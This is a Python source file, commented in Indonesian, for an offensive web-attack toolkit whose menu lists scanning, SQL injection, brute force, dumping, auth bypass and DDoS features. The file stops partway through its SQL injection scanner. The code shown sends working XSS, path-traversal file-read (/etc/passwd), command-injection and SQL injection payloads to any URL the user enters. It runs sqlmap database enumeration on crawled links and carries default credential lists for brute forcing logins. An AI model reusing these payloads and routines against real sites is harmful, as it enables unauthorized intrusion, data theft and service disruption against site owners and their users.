#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════╗
# ║     SPECTRA X VOID - ULTIMATE EDITION v9.0                  ║
# ║     💍 ROUNDED EDITION - MODERN TERMINAL UI                  ║
# ║     Dibuat oleh MOMMY buat SUAMIKU ❤️                        ║
# ╚══════════════════════════════════════════════════════════════╝

import os, sys, socket, requests, re, time, json, random, base64, shutil, zipfile, threading, subprocess, webbrowser
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===== RICH LIBRARY =====
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.text import Text
from rich import box

console = Console()

# ===== SUPPRESS WARNINGS =====
import warnings
import urllib3
warnings.filterwarnings("ignore")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== COLOR (FALLBACK) =====
class W:
    H = '\033[92m'; K = '\033[93m'; M = '\033[91m'
    C = '\033[96m'; B = '\033[94m'; U = '\033[95m'
    BD = '\033[1m'; N = '\033[0m'

# ===== SESSION =====
session = requests.Session()
session.verify = False
session.headers.update({
    'User-Agent': random.choice([
        'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15'
    ]),
    'Accept': '*/*',
    'Accept-Language': 'id,en-US;q=0.9'
})

# ===== DATA =====
UA_LIST = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
    'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0.0.0',
]

POST_TEMPLATES = [
    {'username': 'admin', 'password': 'test123', 'login': 'Submit'},
    {'search': 'test' * 100, 'submit': 'Search'},
    {'name': 'test', 'email': 'test@test.com', 'message': 'test' * 500},
    {'data': 'x' * 10000, 'action': 'upload'},
]

USERS = ['admin','administrator','root','user','guru','kepsek','operator','staff']
PASSES = ['admin','admin123','password','123456','12345678','rahasia','admin2024','pass123']

# ===== UTILITY =====
def create_folders():
    for f in ['results/scanner','results/sqli','results/brute','results/dumper','results/tools','results/logs']:
        os.makedirs(f, exist_ok=True)

def save_result(data, cat, fname=None):
    if not fname: fname = f"{cat}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    path = f'results/{cat}/{fname}'
    with open(path, 'w') as f: f.write(str(data))
    return path

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def get_url():
    url = console.input(f"[yellow][?][/yellow] URL: ")
    if not url: return None
    if not url.startswith('http'): url = 'http://' + url
    return url

def get_normal(url):
    try:
        r = session.get(url, timeout=10)
        return {'size': len(r.text), 'text': r.text, 'status': r.status_code}
    except: return None

# ============================================================
# LOGO SKULL - EDITABLE
# ============================================================
LOGO_SKULL = """
[bold red]
  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
[/bold red]
"""

# ===== BANNER =====
def banner():
    clear()
    console.print(LOGO_SKULL)
    console.print()
    console.print(Panel(
        "[bold cyan]SPECTRA X VOID - ULTIMATE v9.0[/bold cyan]\n"
        "[yellow]💍 MOMMY ❤️ SUAMIKU | 360+ PAYLOADS 💍[/yellow]",
        title="[bold yellow]🔍 SPECTRA[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    console.print("[green]  [+] 9 Kategori | 50+ Fitur | Anti False Positive[/green]")
    console.print("[dim]  [+] Scanner | SQLi | Brute | Dumper | Tools | Attack | Auth | Polygon[/dim]")
    console.print()

# ===== MENU UTAMA =====
def menu_utama():
    console.print(Panel(
        "[bold cyan]📋 MAIN MENU[/bold cyan]",
        title="[bold yellow]📋 MENU[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    menu_table = Table(show_header=False, box=None, padding=(0, 1))
    menu_table.add_column(style="bold green", width=5)
    menu_table.add_column(style="white", width=55)
    
    menu_table.add_row("[01]", "🔍 SCANNER MENU (9 tools)")
    menu_table.add_row("[02]", "💉 SQL INJECTION MENU (8 tools + 36 DIOS)")
    menu_table.add_row("[03]", "💣 BRUTE FORCE MENU (5 tools)")
    menu_table.add_row("[04]", "🗄️ DUMPER MENU")
    menu_table.add_row("[05]", "🛠️ TOOLS MENU (7 tools)")
    menu_table.add_row("[06]", "🚀 FULL AUTO ATTACK")
    menu_table.add_row("[07]", "☠️ ATTACK MENU (DDoS Overpower)")
    menu_table.add_row("[08]", "🔑 AUTH BYPASS (40+ payload)")
    menu_table.add_row("[09]", "🔷 POLYGON BYPASS (25 payload)")
    menu_table.add_row("")
    menu_table.add_row("[00]", "[dim]💍 KELUAR[/dim]")
    
    console.print(menu_table)
    console.print("[dim]💡 RECOMMENDED: 01 → 02 → 08 → 03[/dim]")

# ===== LOADING ANIMATION =====
def loading_animation():
    clear()
    console.print(LOGO_SKULL)
    console.print()
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[cyan]{task.description}[/cyan]"),
        BarColumn(bar_width=30, style="green"),
        TextColumn("[cyan]{task.percentage:>3.0f}%[/cyan]"),
        console=console,
    ) as progress:
        tasks = [
            "Initializing Ultimate Engine...",
            "Loading 360+ Payloads...",
            "Loading DIOS + WAF Bypass...",
            "Loading Auth Bypass + Polygon...",
            "Checking SQLMap & TOR...",
            "Finalizing Rounded Interface...",
        ]
        task = progress.add_task("", total=len(tasks))
        for i, desc in enumerate(tasks):
            progress.update(task, description=desc, completed=i)
            time.sleep(0.2)
        progress.update(task, completed=len(tasks))
        time.sleep(0.3)
    
    console.print()
    console.print(Panel(
        "[green]✓ ULTIMATE EDITION READY![/green]",
        title="[bold green]✓ READY[/bold green]",
        title_align="center",
        border_style="green",
        box=box.ROUNDED,
        expand=True
    ))
    console.print("\n[dim]Press Enter to continue...[/dim]", end="")
    input()
    clear()

# ============================================================
# [01] SCANNER MENU (9 TOOLS)
# ============================================================
def scanner_menu():
    """🔍 SCANNER MENU - 9 TOOLS"""
    while True:
        clear()
        banner()
        console.print()
        console.print(Panel(
            "[bold cyan]🔍 SCANNER MENU[/bold cyan]\n"
            "[dim]9 Tools untuk reconnaissance & scanning[/dim]",
            title="[bold yellow]🔍 SCANNER[/bold yellow]",
            title_align="center",
            border_style="cyan",
            box=box.ROUNDED,
            expand=True,
            padding=(1, 2)
        ))
        
        scanner_table = Table(show_header=False, box=None, padding=(0, 1))
        scanner_table.add_column(style="bold green", width=5)
        scanner_table.add_column(style="white", width=55)
        
        scanner_table.add_row("[01]", "🔐 Admin Panel Finder (50+ path)")
        scanner_table.add_row("[02]", "🎯 XSS Scanner (42 payload)")
        scanner_table.add_row("[03]", "📁 LFI/RFI Scanner (42 payload)")
        scanner_table.add_row("[04]", "💻 RCE Scanner")
        scanner_table.add_row("[05]", "🔎 Subdomain Finder")
        scanner_table.add_row("[06]", "🎯 CMS Detector")
        scanner_table.add_row("[07]", "🛡️ WAF Detector ⭐ CEK SEBELUM SQLi!")
        scanner_table.add_row("[08]", "🔍 Google Dork Finder (Cari Parameter!)")
        scanner_table.add_row("[09]", "🕷️ Mr. Crawley (Crawl + Parameter!)")
        scanner_table.add_row("")
        scanner_table.add_row("[00]", "[dim]Kembali[/dim]")
        
        console.print(scanner_table)
        console.print("[dim]💡 ALUR RECOMMENDED: 07 → 01 → 06 → 09 → 08[/dim]")
        
        c = console.input(f"[yellow][?][/yellow] Pilih: ")
        
        if c == '0': break
        elif c == '1': scanner_admin()
        elif c == '2': scanner_xss()
        elif c == '3': scanner_lfi()
        elif c == '4': scanner_rce()
        elif c == '5': scanner_subdomain()
        elif c == '6': scanner_cms()
        elif c == '7': scanner_waf()
        elif c == '8': scanner_dork()
        elif c == '9': scanner_crawley()
        else:
            console.print("[red][!] Pilihan salah![/red]")
            console.input("[dim]Press Enter...[/dim]")

# ===== [01] ADMIN PANEL FINDER =====
def scanner_admin():
    """🔐 ADMIN PANEL FINDER"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🔐 [01] ADMIN PANEL FINDER[/bold cyan]\n"
        "[dim]50+ Path | Multi-threading[/dim]",
        title="[bold yellow]🔐 ADMIN FINDER[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = get_url()
    if not url: return
    
    paths = ['/admin/','/administrator/','/wp-admin/','/login/','/panel/','/cms/','/system/','/backend/',
             '/dashboard/','/puspita/admin/','/cp/','/cpanel/','/phpmyadmin/','/config/','/settings/',
             '/admin/login/','/adminpanel/','/secret/','/hidden/','/private/','/secure/','/portal/','/master/']
    found = []
    
    console.print(f"\n[cyan][*] Mencari panel admin...[/cyan]")
    
    with Progress(
        SpinnerColumn(),
        BarColumn(bar_width=30, style="green"),
        TextColumn("[cyan]{task.completed}/{task.total}[/cyan]"),
        console=console,
    ) as progress:
        task = progress.add_task("Scanning...", total=len(paths))
        
        def check(p):
            try:
                r = session.get(url.rstrip('/')+p, timeout=5, allow_redirects=False)
                if r.status_code in [200,301,302,403]:
                    found.append((url.rstrip('/')+p, r.status_code))
                    progress.console.print(f"  [magenta][🔐] {url.rstrip('/')+p} ({r.status_code})[/magenta]")
            except:
                pass
            progress.update(task, advance=1)
        
        for p in paths:
            check(p)
    
    console.print()
    if found:
        console.print(f"[green]Ditemukan {len(found)} panel admin![/green]")
        for u, s in found:
            console.print(f"  [green]→ {u} ({s})[/green]")
        save_result(str(found), 'scanner')
    else:
        console.print("[yellow]Tidak ditemukan.[/yellow]")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [02] XSS SCANNER =====
def scanner_xss():
    """🎯 XSS SCANNER"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🎯 [02] XSS SCANNER (42 PAYLOAD)[/bold cyan]",
        title="[bold yellow]🎯 XSS SCANNER[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = console.input("[yellow][?][/yellow] URL (akhiri =): ")
    if not url: return
    
    payloads = [
        '<script>alert(1);</script>', '<img src=foo.png onerror=alert(/xssed/) />',
        '<marquee><script>alert(\'XSS\')</script></marquee>', '<svg/onload=alert(1)>',
        '</title><script>alert(/xss/)</script>', '<body onload=alert(1)>',
    ]
    vuln = 0
    
    console.print()
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), console=console) as progress:
        task = progress.add_task("Testing XSS...", total=len(payloads))
        for i, p in enumerate(payloads, 1):
            try:
                r = session.get(url+p, timeout=5)
                if p.lower() in r.text.lower():
                    progress.console.print(f"  [green][🔥] #{i} REFLECTED XSS![/green]")
                    vuln += 1
                else:
                    progress.console.print(f"  [dim][✗] #{i}[/dim]")
            except:
                pass
            progress.update(task, advance=1)
    
    console.print(f"\n[green]Total XSS: {vuln}/{len(payloads)}[/green]")
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [03] LFI SCANNER =====
def scanner_lfi():
    """📁 LFI SCANNER"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]📁 [03] LFI/RFI SCANNER (42 PAYLOAD)[/bold cyan]",
        title="[bold yellow]📁 LFI SCANNER[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = get_url()
    if not url: return
    
    payloads = [
        '/etc/passwd', '../../../etc/passwd', 'php://filter/convert.base64-encode/resource=index',
        '/etc/passwd%00', '//etc/passwd', '///etc/passwd', 'file:///etc/passwd',
    ]
    vuln = 0
    
    console.print()
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), console=console) as progress:
        task = progress.add_task("Testing LFI...", total=len(payloads))
        for p in payloads:
            try:
                test = url+p if '=' in url else url+'?file='+p
                r = session.get(test, timeout=10)
                if 'root:' in r.text or '<?php' in r.text or 'daemon:' in r.text:
                    progress.console.print(f"  [green][🔥] LFI: {test}[/green]")
                    vuln += 1
                else:
                    progress.console.print(f"  [dim][✗] {p[:40]}[/dim]")
            except:
                pass
            progress.update(task, advance=1)
    
    console.print(f"\n[green]Total LFI: {vuln}/{len(payloads)}[/green]")
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [04] RCE SCANNER =====
def scanner_rce():
    """💻 RCE SCANNER"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]💻 [04] RCE SCANNER[/bold cyan]",
        title="[bold yellow]💻 RCE SCANNER[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = get_url()
    if not url: return
    
    for cmd in ['id','uname -a','whoami']:
        try:
            test = url+cmd if '=' in url else url+'?cmd='+cmd
            r = session.get(test, timeout=10)
            if 'uid=' in r.text or 'Administrator' in r.text:
                console.print(f"  [green][🔥] RCE: {test}[/green]")
            else:
                console.print(f"  [dim][✗] {cmd}[/dim]")
        except:
            pass
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [05] SUBDOMAIN FINDER =====
def scanner_subdomain():
    """🔎 SUBDOMAIN FINDER"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🔎 [05] SUBDOMAIN FINDER[/bold cyan]",
        title="[bold yellow]🔎 SUBDOMAIN[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    domain = console.input("[yellow][?][/yellow] Domain: ")
    if not domain: return
    
    subs = ['www','mail','ftp','webmail','cpanel','admin','blog','shop','api','dev','portal','cdn','mobile','app']
    found = []
    
    with Progress(SpinnerColumn(), BarColumn(bar_width=30, style="green"), console=console) as progress:
        task = progress.add_task("Scanning...", total=len(subs))
        for s in subs:
            try:
                ip = socket.gethostbyname(f"{s}.{domain}")
                found.append((f"{s}.{domain}", ip))
                progress.console.print(f"  [green][+] {s}.{domain} → {ip}[/green]")
            except:
                pass
            progress.update(task, advance=1)
    
    console.print(f"\n[green]Ditemukan {len(found)} subdomain![/green]")
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [06] CMS DETECTOR =====
def scanner_cms():
    """🎯 CMS DETECTOR"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🎯 [06] CMS DETECTOR[/bold cyan]",
        title="[bold yellow]🎯 CMS DETECTOR[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = get_url()
    if not url: return
    
    try:
        r = session.get(url, timeout=10)
        for cms, sig in [('WordPress','wp-content'),('Joomla','Joomla'),('Drupal','Drupal'),
                         ('Magento','Magento'),('Laravel','csrf-token')]:
            if sig in r.text:
                console.print(f"  [green][+] CMS: {cms}[/green]")
        console.print(f"  [green][+] Server: {r.headers.get('Server','?')}[/green]")
    except:
        console.print("[red][!] Error[/red]")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [07] WAF DETECTOR =====
def scanner_waf():
    """🛡️ WAF DETECTOR"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🛡️ [07] WAF DETECTOR[/bold cyan]\n"
        "[dim]Deteksi Web Application Firewall[/dim]",
        title="[bold yellow]🛡️ WAF DETECTOR[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = get_url()
    if not url: return
    
    waf_signatures = {
        'Cloudflare': [('Server', 'cloudflare'), ('cf-ray', '')],
        'ModSecurity': [('Server', 'mod_security'), ('Mod_Security', '')],
        'AWS WAF': [('Server', 'awselb')],
        'Sucuri': [('Server', 'Sucuri')],
        'Akamai': [('Server', 'AkamaiGHost')],
        'Incapsula': [('X-CDN', 'Incapsula')],
        'LiteSpeed WAF': [('Server', 'LiteSpeed')],
    }
    
    waf_found = []
    
    console.print(f"\n[cyan][*] Mendeteksi WAF...[/cyan]")
    
    with Progress(SpinnerColumn(), BarColumn(bar_width=30, style="green"), console=console) as progress:
        task = progress.add_task("Testing...", total=3)
        
        for payload in ["' OR '1'='1", "<script>alert(1)</script>", "UNION SELECT"]:
            try:
                r_test = session.get(url + "?test=" + quote(payload), timeout=10)
                for waf_name, signatures in waf_signatures.items():
                    for key, value in signatures:
                        for h_key, h_value in r_test.headers.items():
                            if key.lower() in h_key.lower() and (not value or value.lower() in str(h_value).lower()):
                                if waf_name not in waf_found:
                                    waf_found.append(waf_name)
                                    progress.console.print(f"  [red][🛡️] {waf_name} terdeteksi![/red]")
            except:
                pass
            progress.update(task, advance=1)
    
    console.print()
    if waf_found:
        console.print(f"[red]WAF TERDETEKSI![/red]")
        for w in waf_found:
            console.print(f"  [yellow]→ {w}[/yellow]")
        console.print(f"\n[yellow][💡] Gunakan Menu 02 → 05 (WAF Bypass)![/yellow]")
    else:
        console.print(f"[green]✅ TIDAK ADA WAF! Aman untuk payload standar![/green]")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [08] GOOGLE DORK FINDER =====
def scanner_dork():
    """🔍 GOOGLE DORK FINDER"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🔍 [08] GOOGLE DORK FINDER[/bold cyan]\n"
        "[dim]Cari parameter di Google dengan dork otomatis[/dim]",
        title="[bold yellow]🔍 DORK FINDER[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = get_url()
    if not url: return
    
    domain = urlparse(url).netloc
    
    console.print(f"\n[bold cyan][*] Target: {domain}[/bold cyan]")
    console.print(f"\n[bold yellow]Pilih jenis dork:[/bold yellow]\n")
    
    dork_table = Table(show_header=False, box=None, padding=(0, 1))
    dork_table.add_column(style="bold green", width=5)
    dork_table.add_column(style="white", width=55)
    
    dork_table.add_row("[01]", "Cari parameter ?id=")
    dork_table.add_row("[02]", "Cari parameter ?page=")
    dork_table.add_row("[03]", "Cari parameter ?news=")
    dork_table.add_row("[04]", "Cari parameter ?view=")
    dork_table.add_row("[05]", "Cari parameter ?cat=")
    dork_table.add_row("[06]", "Cari SEMUA parameter")
    dork_table.add_row("[07]", "Cari halaman admin/login")
    dork_table.add_row("[08]", "Custom dork (ketik sendiri)")
    
    console.print(dork_table)
    
    c = console.input(f"\n[yellow][?][/yellow] Pilih: ")
    
    dork_map = {
        '1': f'site:{domain} inurl:?id=',
        '2': f'site:{domain} inurl:?page=',
        '3': f'site:{domain} inurl:?news=',
        '4': f'site:{domain} inurl:?view=',
        '5': f'site:{domain} inurl:?cat=',
        '6': f'site:{domain} inurl:?id= | inurl:?page= | inurl:?news= | inurl:?view= | inurl:?cat=',
        '7': f'site:{domain} inurl:admin | inurl:login',
    }
    
    if c in dork_map:
        dork = dork_map[c]
        console.print(f"\n[cyan][*] Dork: {dork}[/cyan]")
        query = dork.replace(" ", "+")
        webbrowser.open(f"https://www.google.com/search?q={query}")
        console.print(f"\n[green][✓] Browser terbuka![/green]")
        console.print(f"\n[yellow][💡] Tips:[/yellow]")
        console.print(f"  [dim]• Lihat hasil Google, cari URL yang ada ?id= atau ?page=[/dim]")
        console.print(f"  [dim]• Copy URL tersebut, test pakai SQLMap Auto![/dim]")
    elif c == '8':
        custom = console.input("[yellow][?][/yellow] Dork custom: ")
        if custom:
            query = custom.replace(" ", "+")
            webbrowser.open(f"https://www.google.com/search?q={query}")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ===== [09] MR. CRAWLEY =====
def scanner_crawley():
    """🕷️ MR. CRAWLEY - Web Crawler & Parameter Finder"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🕷️ [09] MR. CRAWLEY - CRAWLER & PARAMETER FINDER[/bold cyan]\n"
        "[dim]Crawl semua link + Deteksi parameter + Auto SQLMap[/dim]",
        title="[bold yellow]🕷️ MR. CRAWLEY[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = console.input("[yellow][?][/yellow] URL target: ")
    if not url: return
    if not url.startswith('http'): url = 'http://' + url
    
    threads = console.input("[yellow][?][/yellow] Threads (default 10): ") or "10"
    threads = int(threads)
    
    console.print(f"\n[cyan][*] Target: {url}[/cyan]")
    console.print(f"[cyan][*] Threads: {threads}[/cyan]\n")
    
    from bs4 import BeautifulSoup
    from queue import Queue as Q
    
    crawled = set()
    queue = Q()
    found_links = []
    param_links = []
    start_time = time.time()
    
    headers = {'User-Agent': random.choice(UA_LIST)}
    
    def extract_links(html, current_url):
        links = set()
        try:
            soup = BeautifulSoup(html, "html.parser")
            for tag in soup.find_all(["a", "link"]):
                href = tag.get("href")
                if href:
                    full_url = urljoin(current_url, href)
                    if full_url.startswith(url) and full_url not in crawled:
                        links.add(full_url)
        except:
            pass
        return links
    
    def crawl_page(current_url):
        try:
            response = session.get(current_url, headers=headers, timeout=10)
            if response.status_code == 200:
                crawled.add(current_url)
                links = extract_links(response.text, current_url)
                for link in links:
                    if link not in crawled:
                        queue.put(link)
                        found_links.append(link)
                        if '?' in link:
                            param_links.append(link)
                            console.print(f"  [green][🔗] {link} [yellow][PARAM!][/yellow][/green]")
                        else:
                            console.print(f"  [dim][+] {link}[/dim]")
        except:
            pass
    
    queue.put(url)
    found_links.append(url)
    
    console.print(f"[bold yellow]🕷️ Crawling...[/bold yellow]\n")
    
    with Progress(SpinnerColumn(), TextColumn("[cyan]Crawling...[/cyan]"), console=console) as progress:
        task = progress.add_task("", total=None)
        for _ in range(threads):
            t = threading.Thread(target=lambda: [crawl_page(queue.get()) for _ in range(100) if not queue.empty()])
            t.daemon = True
            t.start()
        while queue.qsize() > 0:
            time.sleep(0.5)
    
    duration = time.time() - start_time
    
    console.print(f"\n[bold cyan]📋 HASIL CRAWL:[/bold cyan]")
    console.print(f"  [green]✅ Total Link: {len(found_links)}[/green]")
    console.print(f"  [yellow]🔗 Dengan Parameter: {len(param_links)}[/yellow]")
    console.print(f"  [dim]⏱️ Waktu: {duration:.2f} detik[/dim]")
    
    if param_links:
        console.print(f"\n[bold yellow]🔗 LINK DENGAN PARAMETER:[/bold yellow]")
        param_table = Table(border_style="yellow", box=box.SIMPLE)
        param_table.add_column("No", style="bold green", width=4)
        param_table.add_column("Link", style="white", max_width=60)
        param_table.add_column("Parameter", style="cyan", width=20)
        
        for i, link in enumerate(param_links, 1):
            params = link.split('?')[1].split('&')[0].split('=')[0] if '?' in link and '=' in link.split('?')[1] else "?"
            param_table.add_row(str(i), link, params)
        
        console.print(param_table)
        
        console.print(f"\n[bold yellow][?] Mau test SQLi ke link di atas?[/bold yellow]")
        if console.input(f"[yellow][?][/yellow] (y/n): ").lower() == 'y':
            num = console.input(f"[yellow][?][/yellow] Pilih nomor link: ")
            if num.isdigit() and 1 <= int(num) <= len(param_links):
                selected_url = param_links[int(num)-1]
                console.print(f"\n[cyan][*] Target: {selected_url}[/cyan]")
                os.system(f"sqlmap -u \"{selected_url}\" --dbs --batch --random-agent")
    
    console.input("\n[dim]Press Enter...[/dim]")

# ============================================================
# [02] SQL INJECTION MENU (8 TOOLS) - UPGRADED
# ============================================================
def sqli_menu():
    """💉 SQL INJECTION MENU - 8 TOOLS + 360+ PAYLOADS"""
    while True:
        clear()
        banner()
        console.print()
        console.print(Panel(
            "[bold cyan]💉 SQL INJECTION MENU[/bold cyan]\n"
            "[dim]8 Tools | 360+ Payloads | DIOS | WAF Bypass[/dim]",
            title="[bold yellow]💉 SQL INJECTION[/bold yellow]",
            title_align="center",
            border_style="cyan",
            box=box.ROUNDED,
            expand=True,
            padding=(1, 2)
        ))
        
        sqli_table = Table(show_header=False, box=None, padding=(0, 1))
        sqli_table.add_column(style="bold green", width=5)
        sqli_table.add_column(style="white", width=55)
        
        sqli_table.add_row("[01]", "SQLi Scanner (ANTI FALSE POSITIVE V2)")
        sqli_table.add_row("[02]", "Error Based Extractor (6 payload)")
        sqli_table.add_row("[03]", "Union Select Injector")
        sqli_table.add_row("[04]", "Column Counter ⭐ PENTING!")
        sqli_table.add_row("[05]", "WAF Bypass Toolkit (50+ payload!) ⭐ WAJIB!")
        sqli_table.add_row("[06]", "Custom Query Builder")
        sqli_table.add_row("[07]", "DIOS Visual Dumper (36 varian!) ⭐ FAVORIT!")
        sqli_table.add_row("[08]", "SQLMap Auto + Monitor + Crawl ⭐ UPGRADED!")
        sqli_table.add_row("")
        sqli_table.add_row("[00]", "[dim]Kembali[/dim]")
        
        console.print(sqli_table)
        console.print("[dim]💡 ALUR RECOMMENDED: 05 → 04 → 01 → 07 → 08[/dim]")
        
        c = console.input(f"[yellow][?][/yellow] Pilih: ")
        
        if c == '0': break
        elif c == '1': sqli_scanner()
        elif c == '2': sqli_error()
        elif c == '3': sqli_union()
        elif c == '4': sqli_column()
        elif c == '5': sqli_waf()
        elif c == '6': sqli_custom()
        elif c == '7': sqli_dios()
        elif c == '8': sqli_sqlmap()
        else:
            console.print("[red][!] Pilihan salah![/red]")
            console.input("[dim]Press Enter...[/dim]")

# ===== [01] SQLi SCANNER - ANTI FALSE POSITIVE V2 =====
def sqli_scanner():
    """🔍 SQLi SCANNER - ANTI FALSE POSITIVE V2"""
    clear(); banner()
    console.print()
    console.print(Panel(
        "[bold cyan]🔍 [01] SQLi SCANNER (ANTI FALSE POSITIVE V2)[/bold cyan]\n"
        "[dim]Verifikasi ganda | Label CONFIRMED/FALSE POSITIVE[/dim]",
        title="[bold yellow]🔍 SQLi SCANNER[/bold yellow]",
        title_align="center",
        border_style="cyan",
        box=box.ROUNDED,
        expand=True,
        padding=(1, 2)
    ))
    
    url = get_url()
    if not url: return
    
    normal = get_normal(url)
    if not normal:
        console.print("[red][!] Gagal akses URL![/red]")
        console.input()
        return
    
    console.print(f"[dim]Baseline: {normal['size']} bytes[/dim]\n")
    
    payloads = [
        ("Error (')", "'", "basic"),
        ("Error (\")", '"', "basic"),
        ("AND True", "' AND 1=1-- -", "verify_and"),
        ("AND False", "' AND 1=2-- -", "verify_and"),
        ("OR True", "' OR '1'='1", "basic"),
        ("Union", "' UNION SELECT NULL-- -", "basic"),
        ("Time (3s)", "' AND SLEEP(3)-- -", "time"),
    ]
    
    confirmed = []
    false_positive = []
    
    console.print("[bold yellow][*] Testing payloads...[/bold yellow]\n")
    
    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}[/cyan]"), console=console) as progress:
        task = progress.add_task("Scanning...", total=len(payloads))
        
        i = 0
        while i < len(payloads):
            name, pay, ptype = payloads[i]
            
            if ptype == "verify_and":
                name_true, pay_true, _ = payloads[i]
                name_false, pay_false, _ = payloads[i+1]
                
                try:
                    r_true = session.get(url + pay_true, timeout=10)
                    r_false = session.get(url + pay_false, timeout=10)
                    diff_between = abs(len(r_true.text) - len(r_false.text))
                    
                    if diff_between > 100:
                        progress.console.print(f"  [green][🔥] CONFIRMED SQLi! AND 1=1 ≠ AND 1=2 (Δ{diff_between}b)[/green]")
                        confirmed.append((name_true, url+pay_true))
                        confirmed.append((name_false, url+pay_false))
                    else:
                        progress.console.print(f"  [yellow][⚠] FALSE POSITIVE! AND 1=1 & 1=2 sama (Δ{diff_between}b)[/yellow]")
                        false_positive.append((name, f"Δ{diff_between}b"))
                except:
                    progress.console.print(f"  [dim][✗] Error[/dim]")
                
                i += 2
                progress.update(task, advance=2)
                continue
            
            try:
                r = session.get(url + pay, timeout=10)
                diff = abs(len(r.text) - normal['size'])
                has_err = any(e in r.text.lower() for e in ['sql','mysql','syntax','error','warning'])
                
                if ptype == "time":
                    start = time.time()
                    r = session.get(url + pay, timeout=10)
                    elapsed = time.time() - start
                    if elapsed > 2.5:
                        progress.console.print(f"  [green][🔥] CONFIRMED Time-Based! ({elapsed:.1f}s delay)[/green]")
                        confirmed.append((name, url+pay))
                    else:
                        progress.console.print(f"  [dim][✗] {name} - No delay[/dim]")
                elif has_err and diff > 500:
                    progress.console.print(f"  [green][🔥] CONFIRMED! {name} (Δ{diff}b + SQL error)[/green]")
                    confirmed.append((name, url+pay))
                elif diff > 1000:
                    progress.console.print(f"  [yellow][⚠] FALSE POSITIVE? {name} (Δ{diff}b, no SQL error)[/yellow]")
                    false_positive.append((name, f"Δ{diff}b"))
                else:
                    progress.console.print(f"  [dim][✗] {name} - Aman[/dim]")
            except:
                progress.console.print(f"  [dim][✗] {name} - Error[/dim]")
            
            i += 1
            progress.update(task, advance=1)
    
    console.print(f"\n[bold cyan]📋 RINGKASAN:[/bold cyan]")
    console.print(f"  [green]✓ CONFIRMED SQLi: {len(confirmed)}[/green]")
    console.print(f"  [yellow]⚠ FALSE POSITIVE: {len(false_positive)}[/yellow]")
    
    if confirmed:
        console.print(f"\n[bold green][💀] CELAH TERKONFIRMASI:[/bold green]")
        for n, u in confirmed:
